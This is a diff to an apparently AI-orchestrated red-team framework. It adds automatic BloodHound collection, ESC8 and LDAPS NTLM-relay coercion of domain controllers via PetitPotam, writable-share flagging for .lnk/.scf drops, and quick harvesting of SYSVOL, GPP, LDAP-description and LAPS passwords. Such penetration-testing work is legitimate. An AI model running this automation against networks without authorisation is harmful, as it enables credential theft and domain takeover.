@@ -29,6 +29,7 @@ from ares.core.models import (
     AgentInfo,
     AgentRole,
     Credential,
+    Host,
     InvestigationStage,
     RedTeamState,
     SharedRedTeamState,
@@ -44,6 +45,9 @@ from ares.tools.red.orchestrator import OrchestratorTools
 
 # Default max runtime in seconds (30 minutes), configurable via ARES_MAX_RUNTIME env var
 DEFAULT_MAX_RUNTIME = float(os.environ.get("ARES_MAX_RUNTIME", "1800"))
+
+# Grace period for running crack tasks when operation is completing (5 minutes)
+CRACK_TASK_GRACE_PERIOD = float(os.environ.get("ARES_CRACK_GRACE_PERIOD", "300"))
 
 
 def _resolve_model_generator(model: str, openai_api_key: str | None) -> str | rg.Generator:
@@ -412,6 +416,8 @@ async def run_multi_agent_operation(  # noqa: PLR0912
         asyncio.create_task(_auto_mssql_detection(dispatcher), name="auto_mssql_detection"),
         asyncio.create_task(_auto_adcs_enumeration(dispatcher), name="auto_adcs_enumeration"),
         asyncio.create_task(_auto_share_spider(dispatcher), name="auto_share_spider"),
+        asyncio.create_task(_auto_bloodhound(dispatcher), name="auto_bloodhound"),
+        asyncio.create_task(_auto_coercion(dispatcher), name="auto_coercion"),
     ]
 
     # Build initial prompt for orchestrator
@@ -545,6 +551,8 @@ async def run_multi_agent_operation(  # noqa: PLR0912
 
         if dispatcher.shared_state.completed:
             logger.info("Operation marked complete; skipping post-run wait")
+            # Still wait for running crack tasks to complete
+            await _wait_for_crack_tasks(dispatcher)
         else:
             # Wait for any remaining background tasks
             await _wait_for_completion(dispatcher, tasks, max_runtime=resolved_max_runtime)
@@ -997,7 +1005,7 @@ async def _auto_mssql_detection(
 async def _auto_adcs_enumeration(  # noqa: PLR0912
     dispatcher: RedTeamDispatcher,
     check_interval: float = 45.0,
-    max_retries: int = 3,
+    max_retries: int = 5,
 ) -> None:
     """
     Background task that automatically runs ADCS enumeration when:
@@ -1015,7 +1023,7 @@ async def _auto_adcs_enumeration(  # noqa: PLR0912
     # Track (server, user, domain) -> (task_id, attempt_count, last_attempt_time)
     adcs_attempts: dict[tuple[str, str, str], tuple[str, int, float]] = {}
     successful_servers: set[str] = set()  # Servers with successful enumeration
-    retry_cooldown = 120.0  # Wait 2 minutes before retrying failed tasks
+    retry_cooldown = 60.0  # Wait 1 minute before retrying failed tasks
 
     while True:
         try:
@@ -1083,7 +1091,7 @@ async def _auto_adcs_enumeration(  # noqa: PLR0912
 
                         # Check if task failed (not in pending_tasks means it completed/failed)
                         if task_id not in state.pending_tasks:
-                            logger.warning(
+                            logger.info(
                                 f"🔄 Auto-ADCS: Retrying {server_ip} with {cred.domain}\\{cred.username} "
                                 f"(attempt {attempt_count + 1}/{max_retries})"
                             )
@@ -1223,6 +1231,133 @@ async def _auto_share_spider(
             break
         except Exception as e:
             logger.error(f"Auto share spider error: {e}", exc_info=True)
+            await asyncio.sleep(check_interval)
+
+
+async def _auto_bloodhound(  # noqa: PLR0912
+    dispatcher: RedTeamDispatcher,
+    check_interval: float = 30.0,
+    max_retries: int = 3,
+) -> None:
+    """
+    Background task that automatically runs BloodHound when credentials are discovered.
+
+    BloodHound collection is critical for finding attack paths to Domain Admin.
+    This ensures it runs early once we have valid credentials, without relying
+    on the orchestrator to remember to dispatch it.
+
+    Args:
+        dispatcher: The dispatcher instance
+        check_interval: Seconds between checks for new credentials
+        max_retries: Maximum retry attempts per domain
+    """
+    # Track (domain, username) -> (task_id, attempt_count, last_attempt_time)
+    bloodhound_attempts: dict[tuple[str, str], tuple[str, int, float]] = {}
+    successful_domains: set[str] = set()  # Domains with successful BloodHound
+    retry_cooldown = 120.0  # Wait 2 minutes before retrying failed tasks
+
+    while True:
+        try:
+            await asyncio.sleep(check_interval)
+
+            state = dispatcher.shared_state
+
+            # Skip if operation is complete
+            if state.completed or state.has_domain_admin:
+                logger.debug("Operation complete, stopping BloodHound automation")
+                break
+
+            # Need credentials to run BloodHound
+            if not state.all_credentials:
+                logger.debug("BloodHound scanner: waiting for credentials")
+                continue
+
+            # Get all known domains
+            domains: set[str] = set()
+            if state.target and state.target.domain:
+                domains.add(state.target.domain.lower())
+            for cred in state.all_credentials:
+                if cred.domain:
+                    domains.add(cred.domain.lower())
+
+            if not domains:
+                continue
+
+            current_time = asyncio.get_event_loop().time()
+
+            # Try to run BloodHound for each domain
+            for domain in domains:
+                # Skip domains we've already successfully enumerated
+                if domain.lower() in successful_domains:
+                    continue
+
+                # Find a credential for this domain
+                for cred in state.all_credentials:
+                    if not cred.password:
+                        continue
+
+                    cred_domain = (cred.domain or "").lower()
+                    # Use credentials from same domain, or if no domain try anyway
+                    if cred_domain and cred_domain != domain.lower():
+                        continue
+
+                    cred_key = (domain.lower(), cred.username.lower())
+
+                    # Check if we've already attempted with this credential
+                    if cred_key in bloodhound_attempts:
+                        task_id, attempt_count, last_attempt = bloodhound_attempts[cred_key]
+
+                        # Check if the task completed successfully
+                        task_info = state.pending_tasks.get(task_id)
+                        if task_info and task_info.status == TaskStatus.COMPLETED:
+                            successful_domains.add(domain.lower())
+                            logger.info(f"BloodHound collection succeeded for {domain}")
+                            break
+
+                        # Skip if max retries reached
+                        if attempt_count >= max_retries:
+                            continue
+
+                        # Skip if still in cooldown
+                        if current_time - last_attempt < retry_cooldown:
+                            continue
+
+                        # Check if task failed (not in pending_tasks means it completed/failed)
+                        if task_id not in state.pending_tasks:
+                            logger.info(
+                                f"🔄 Auto-BloodHound: Retrying {domain} with {cred.domain}\\{cred.username} "
+                                f"(attempt {attempt_count + 1}/{max_retries})"
+                            )
+                        else:
+                            # Task still in progress
+                            continue
+                    else:
+                        attempt_count = 0
+
+                    logger.warning(
+                        f"🩸 Auto-BloodHound: Dispatching collection for {domain} "
+                        f"with {cred.domain}\\{cred.username}"
+                    )
+
+                    task_id = await dispatcher.request_recon(
+                        source_agent="orchestrator",
+                        domain=domain,
+                        username=cred.username,
+                        password=cred.password,
+                        reason="bloodhound",
+                        techniques=["bloodhound"],
+                    )
+
+                    if task_id:
+                        bloodhound_attempts[cred_key] = (task_id, attempt_count + 1, current_time)
+                        logger.info(f"BloodHound task {task_id} dispatched for {domain}")
+                        # Only dispatch one task per domain per cycle
+                        break
+
+        except asyncio.CancelledError:
+            break
+        except Exception as e:
+            logger.error(f"BloodHound automation error: {e}", exc_info=True)
             await asyncio.sleep(check_interval)
 
 
@@ -1417,8 +1552,10 @@ async def _auto_credential_access(  # noqa: PLR0912
                     reason="new_credential",
                     techniques=["kerberoast", "secretsdump", "lsassy"],
                 )
-                # Also dispatch SYSVOL/GPP search separately (only needs DC targets)
-                # This is high-value low-hanging fruit that often contains hardcoded creds
+                # Also dispatch FAST credential discovery separately (only needs DC targets)
+                # These are high-value low-hanging fruit that take ~2-5 seconds each
+                # Running them separately ensures they complete quickly without getting
+                # blocked by slow recon (smb_sweep) or credential dumping (secretsdump)
                 dc_hosts = [
                     h
                     for h in domain_hosts
@@ -1436,8 +1573,13 @@ async def _auto_credential_access(  # noqa: PLR0912
                     username=cred.username,
                     password=cred.password,
                     credential_source=cred.source,
-                    reason="sysvol_gpp_search",
-                    techniques=["sysvol_script_search", "gpp_password_finder"],
+                    reason="fast_credential_discovery",
+                    techniques=[
+                        "sysvol_script_search",  # ~2 sec, hardcoded passwords in SYSVOL
+                        "gpp_password_finder",  # ~2 sec, GPP/cpassword credentials
+                        "ldap_search_descriptions",  # ~3 sec, passwords in user descriptions
+                        "laps_dump",  # ~2 sec, LAPS local admin passwords
+                    ],
                 )
                 if task_id:
                     processed_creds.add(key)
@@ -1519,6 +1661,242 @@ async def _auto_credential_access(  # noqa: PLR0912
             await asyncio.sleep(check_interval)
 
 
+async def _auto_coercion(  # noqa: PLR0912
+    dispatcher: RedTeamDispatcher,
+    check_interval: float = 60.0,
+) -> None:
+    """
+    Background task that automatically triggers coercion attacks when conditions are met.
+
+    Monitors for:
+    1. ADCS servers with web enrollment → ESC8 relay attacks (ntlmrelayx + petitpotam)
+    2. Domain controllers → petitpotam/coercer coercion for credential relay
+    3. Writable shares → potential for file-based coercion (.lnk/.scf drops)
+
+    This automates the coercion workflow that attackers would normally coordinate manually.
+
+    Args:
+        dispatcher: The dispatcher instance
+        check_interval: Seconds between coercion checks
+    """
+    # Track what we've already triggered to avoid duplicates
+    esc8_attempted_servers: set[str] = set()  # ADCS servers we've started ESC8 against
+    coerced_dcs: set[str] = set()  # DCs we've attempted to coerce
+    writable_share_targets: set[tuple[str, str]] = set()  # (host, share) combos notified
+
+    while True:
+        try:
+            await asyncio.sleep(check_interval)
+
+            state = dispatcher.shared_state
+
+            # Skip if operation is complete
+            if state.completed or state.has_domain_admin:
+                logger.debug("Operation complete, stopping auto coercion")
+                break
+
+            # Need at least some credentials to make coercion worthwhile
+            # (captured hashes need to be relayed or cracked)
+            if not state.all_credentials and not state.all_hashes:
+                logger.debug("Auto coercion: waiting for credentials before starting coercion")
+                continue
+
+            # Helper function to detect Domain Controllers
+            def _is_dc(host: Host) -> bool:
+                """Check if host is a Domain Controller.
+
+                Detection methods:
+                1. Explicit DC roles (from SRV lookup or BloodHound)
+                2. DC services (Kerberos 88, LDAP 389)
+                3. Hostname contains "dc"
+                """
+                # Check explicit roles (from SRV lookup, BloodHound, or manual tagging)
+                if any(
+                    r.lower() in ("dc", "domain controller", "domaincontroller", "ad dc")
+                    for r in (host.roles or [])
+                ):
+                    return True
+                # Check DC-like services (Kerberos, LDAP)
+                for svc in host.services or []:
+                    svc_lower = svc.lower()
+                    if svc_lower.startswith(("88/tcp", "389/tcp")):
+                        return True
+                    if "kerberos" in svc_lower or "ldap" in svc_lower:
+                        return True
+                # Check if hostname contains "dc"
+                return "dc" in (host.hostname or "").lower()
+
+            # === ESC8 RELAY ATTACK ===
+            # When ADCS servers with web enrollment are detected, start ntlmrelayx + petitpotam
+            adcs_servers = dispatcher.find_adcs_servers()
+            for server_ip, server_hostname in adcs_servers:
+                if server_ip in esc8_attempted_servers:
+                    continue
+
+                # Find a DC to coerce for ESC8 (DCs authenticating to ADCS = domain admin cert)
+                dcs = [
+                    h
+                    for h in state.all_hosts
+                    if _is_dc(h) and h.ip != server_ip  # Don't coerce the ADCS server to itself
+                ]
+
+                if not dcs:
+                    logger.debug(f"Auto coercion: ADCS {server_ip} found but no DCs to coerce yet")
+                    continue
+
+                # Pick the first available DC
+                target_dc = dcs[0]
+
+                # Dispatch ESC8 coercion task
+                # This will start ntlmrelayx to ADCS and coerce the DC
+                task_id = await dispatcher.request_coercion(
+                    source_agent="orchestrator",
+                    techniques=["petitpotam", "coercer"],
+                    payload_override={
+                        "attack_type": "esc8",
+                        "adcs_server": server_ip,
+                        "adcs_hostname": server_hostname,
+                        "coerce_target": target_dc.ip,
+                        "coerce_hostname": target_dc.hostname,
+                        "note": (
+                            f"ESC8 RELAY ATTACK: Start ntlmrelayx targeting "
+                            f"http://{server_hostname or server_ip}/certsrv/ with template "
+                            f"DomainController, then coerce {target_dc.hostname or target_dc.ip} "
+                            f"with petitpotam to get DC certificate for domain admin."
+                        ),
+                    },
+                )
+
+                if task_id:
+                    esc8_attempted_servers.add(server_ip)
+                    logger.warning(
+                        f"🎯 Auto ESC8 coercion dispatched: relay to ADCS {server_hostname or server_ip}, "
+                        f"coerce DC {target_dc.hostname or target_dc.ip} (task {task_id})"
+                    )
+
+            # === DC COERCION FOR LDAPS RELAY ===
+            # Even without ADCS, coercing DCs to an LDAPS relay can grant RBCD/shadow creds
+            for host in state.all_hosts:
+                # Reuse the _is_dc function defined above for ESC8
+                if not _is_dc(host) or host.ip in coerced_dcs:
+                    continue
+
+                # Only coerce if we have credentials to authenticate the relay
+                if not state.all_credentials:
+                    continue
+
+                # Dispatch LDAPS relay coercion
+                task_id = await dispatcher.request_coercion(
+                    source_agent="orchestrator",
+                    techniques=["petitpotam", "coercer"],
+                    payload_override={
+                        "attack_type": "ldaps_relay",
+                        "coerce_target": host.ip,
+                        "coerce_hostname": host.hostname,
+                        "relay_target": host.ip,  # Relay to same DC's LDAPS
+                        "note": (
+                            f"LDAPS RELAY: Start ntlmrelayx targeting ldaps://{host.ip} with "
+                            f"--delegate-access, then coerce {host.hostname or host.ip} with "
+                            f"petitpotam to create machine account for RBCD attack."
+                        ),
+                    },
+                )
+
+                if task_id:
+                    coerced_dcs.add(host.ip)
+                    logger.warning(
+                        f"🎯 Auto LDAPS relay coercion dispatched: coerce DC {host.hostname or host.ip} "
+                        f"for RBCD (task {task_id})"
+                    )
+                    # Only do one DC at a time to avoid overwhelming the coercion agent
+                    break
+
+            # === WRITABLE SHARE NOTIFICATION ===
+            # Log writable shares that could be used for file-based coercion (.lnk/.scf drops)
+            # Note: slinky module not currently available, but we flag the opportunity
+            for share in state.all_shares:
+                perms = (share.permissions or "").upper()
+                if "WRITE" not in perms:
+                    continue
+
+                share_key = (share.host.lower(), share.name.lower())
+                if share_key in writable_share_targets:
+                    continue
+
+                # Skip admin shares
+                if share.name.lower() in ("admin$", "c$", "d$", "e$", "ipc$"):
+                    continue
+
+                writable_share_targets.add(share_key)
+                logger.info(
+                    f"📁 Writable share detected: {share.host}/{share.name} ({perms}) - "
+                    f"potential target for file-based coercion (.lnk/.scf drop)"
+                )
+
+        except asyncio.CancelledError:
+            break
+        except Exception as e:
+            logger.error(f"Auto coercion error: {e}", exc_info=True)
+            await asyncio.sleep(check_interval)
+
+
+def _get_running_crack_tasks(dispatcher: RedTeamDispatcher) -> list[str]:
+    """Get task IDs for crack tasks that are still pending (running)."""
+    crack_task_ids = []
+    for task_id, task_info in dispatcher.shared_state.pending_tasks.items():
+        if task_info.task_type == "crack":
+            crack_task_ids.append(task_id)
+    return crack_task_ids
+
+
+async def _wait_for_crack_tasks(
+    dispatcher: RedTeamDispatcher,
+    timeout: float = CRACK_TASK_GRACE_PERIOD,
+    check_interval: float = 5.0,
+) -> None:
+    """
+    Wait for running crack tasks to complete with a timeout.
+
+    Args:
+        dispatcher: The dispatcher instance
+        timeout: Maximum seconds to wait for crack tasks
+        check_interval: Seconds between checks
+    """
+    start_time = asyncio.get_event_loop().time()
+    crack_tasks = _get_running_crack_tasks(dispatcher)
+
+    if not crack_tasks:
+        return
+
+    logger.info(
+        f"Waiting for {len(crack_tasks)} running crack task(s) to complete "
+        f"(grace period: {timeout}s)"
+    )
+
+    while True:
+        elapsed = asyncio.get_event_loop().time() - start_time
+
+        if elapsed > timeout:
+            remaining = _get_running_crack_tasks(dispatcher)
+            if remaining:
+                logger.warning(
+                    f"Crack task grace period expired with {len(remaining)} task(s) "
+                    f"still running: {remaining}"
+                )
+            break
+
+        remaining = _get_running_crack_tasks(dispatcher)
+        if not remaining:
+            logger.success("All crack tasks completed within grace period")
+            break
+
+        logger.debug(
+            f"Waiting for {len(remaining)} crack task(s): {remaining} "
+            f"({elapsed:.0f}s/{timeout:.0f}s elapsed)"
+        )
+        await asyncio.sleep(check_interval)
+
+
 async def _wait_for_completion(
     dispatcher: RedTeamDispatcher,
     background_tasks: list[asyncio.Task],
@@ -1542,14 +1920,20 @@ async def _wait_for_completion(
         # Check runtime limit
         if elapsed > max_runtime:
             logger.warning(f"Operation reached max runtime ({max_runtime}s)")
+            # Wait for running crack tasks before fully exiting
+            await _wait_for_crack_tasks(dispatcher)
             break
 
         # Check for domain admin or explicit completion
         if dispatcher.shared_state.has_domain_admin:
             logger.success("Domain Admin achieved! Operation complete.")
+            # Wait for running crack tasks before fully exiting
+            await _wait_for_crack_tasks(dispatcher)
             break
         if dispatcher.shared_state.completed:
             logger.success("Operation marked complete.")
+            # Wait for running crack tasks before fully exiting
+            await _wait_for_crack_tasks(dispatcher)
             break
 
         # Check for failed background tasks
